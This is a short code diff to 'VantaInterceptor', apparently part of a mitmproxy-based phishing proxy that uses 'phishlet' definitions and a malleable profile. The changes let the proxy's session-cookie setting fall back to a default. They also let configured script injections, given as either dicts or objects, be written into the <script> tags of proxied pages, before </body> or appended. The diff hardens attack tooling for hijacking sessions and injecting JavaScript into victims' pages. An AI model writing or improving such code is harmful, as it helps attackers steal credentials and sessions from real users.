@@ -39,7 +39,9 @@ class VantaInterceptor:
         self.allow_ips = set(config.get_list("ALLOW_IPS"))
         self.deny_ips = set(config.get_list("DENY_IPS"))
         self._buckets = {}  # ip -> [timestamps]
-        self.session_cookie_name = malleable_profile.get('storage_keys.session_cookie', 'vanta_sid')
+        self.session_cookie_name = 'vanta_sid'  # Default session cookie name
+        if malleable_profile is not None:
+            self.session_cookie_name = malleable_profile.get('storage_keys.session_cookie', 'vanta_sid')
 
     async def request(self, flow: http.HTTPFlow):
         """
@@ -782,14 +784,16 @@ class VantaInterceptor:
                 pass
             # Legacy injections
             for injection in getattr(self.phishlet, "injections", []) or []:
-                if injection.position == "body_end":
+                # Handle both dictionary and object formats
+                position = injection.get("position") if isinstance(injection, dict) else getattr(injection, "position", None)
+                if position == "body_end":
                     if "</body>" in flow.response.text:
                         flow.response.text = flow.response.text.replace(
                             "</body>", 
-                            f"<script>{injection.content}</script></body>"
+                            f"<script>{injection.get('content', '') if isinstance(injection, dict) else getattr(injection, 'content', '')}</script></body>"
                         )
                     else:
-                        flow.response.text = (flow.response.text or "") + f"<script>{injection.content}</script>"
+                        flow.response.text = (flow.response.text or "") + f"<script>{injection.get('content', '') if isinstance(injection, dict) else getattr(injection, 'content', '')}</script>"
             
             # New js_inject schema
             for js in getattr(self.phishlet, "js_inject", []) or []:
